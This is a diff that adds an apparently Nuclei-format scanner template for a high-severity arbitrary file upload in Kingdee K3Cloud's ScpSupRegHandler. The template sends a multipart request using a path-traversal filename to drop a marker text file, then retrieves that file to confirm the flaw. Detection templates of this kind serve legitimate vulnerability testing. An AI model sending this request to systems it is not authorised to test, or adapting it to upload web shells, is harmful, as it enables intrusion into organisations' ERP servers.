@@ -1,0 +1,53 @@
+id: Kingdee-ScpSupRegHandler-FileUpload
+
+info:
+  name: 金蝶接口ScpSupRegHandler存在任意文件上传
+  author: htq
+  severity: high
+
+http:
+  - raw:
+    - |
+      @timeout 30s
+      POST /k3cloud/SRM/ScpSupRegHandler HTTP/1.1
+      Host: {{Hostname}}
+      Connection: close
+      Upgrade-Insecure-Requests: 1
+      Content-Type: multipart/form-data; boundary=zsqxokga
+      Accept-Encoding: gzip
+      Content-Length: 276
+
+      --zsqxokga
+      Content-Disposition: form-data; name="dbId_v"
+
+      .
+      --zsqxokga
+      Content-Disposition: form-data; name="FID"
+
+      2022
+      --zsqxokga
+      Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/ccc.txt"
+      Content-Type: text/plain
+
+      Hello123321
+
+      --zsqxokga--
+
+
+
+    
+  - raw:
+    - |
+      @timeout 30s
+      GET /k3cloud/uploadfiles/ccc.txt HTTP/1.1
+      Host: {{Hostname}}
+      Connection: close
+      Upgrade-Insecure-Requests: 1
+      Accept-Encoding: gzip
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Hello123321"
